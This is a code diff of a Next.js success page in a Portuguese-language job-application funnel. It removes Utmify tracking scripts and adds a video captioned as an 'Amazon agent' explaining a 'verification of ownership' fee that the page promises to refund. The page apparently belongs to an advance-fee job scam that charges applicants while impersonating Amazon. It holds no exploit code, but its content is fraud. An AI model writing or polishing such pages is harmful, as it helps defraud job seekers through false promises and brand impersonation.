@@ -3,7 +3,6 @@
 import { useEffect, useState } from "react";
 import Image from "next/image";
 import { useRouter } from "next/navigation";
-import Script from "next/script"; 
 import "./sucess.css";
 
 interface Vaga {
@@ -64,30 +63,6 @@ export default function Sucesso() {
 
   return (
     <main className="candidatura sucesso">
-      {/* Utmify Pixel */}
-      <Script id="utmify-pixel" strategy="afterInteractive">
-        {`
-  window.pixelId = "68c899d501aa460238fc6189";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-        `}
-      </Script>
-
-      {/* Utmify UTMs */}
-      <Script
-        id="utmify-utms"
-        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-        data-utmify-prevent-xcod-sck
-        data-utmify-prevent-subids
-        strategy="afterInteractive"
-        async
-        defer
-      />
-
-
       <header>
         <div className="navbar">
           {/* LOGO */}
@@ -143,7 +118,7 @@ export default function Sucesso() {
           </ul>
         </div>
 
-        {/* Verificação de Titularidade */}
+        {/* Verificação de Titularidade + VÍDEO */}
         <div className="sucesso-taxa">
           <h2>Verificação de Titularidade</h2>
           <p>
@@ -155,6 +130,19 @@ export default function Sucesso() {
             É só um procedimento de verificação: após a conferência, o valor é
             estornado e você recebe o comprovante diretamente no e-mail cadastrado.
           </p>
+
+          {/* 🎥 Vídeo explicativo */}
+          <div className="video-explicativo">
+            <video
+              src="/202509250138 (1).mp4"
+              controls
+              playsInline
+              className="video-container"
+            />
+            <p className="video-legenda">
+              Agente Amazon explicando o processo de verificação e taxa de titularidade.
+            </p>
+          </div>
 
           <button
             className="btn-pagar"
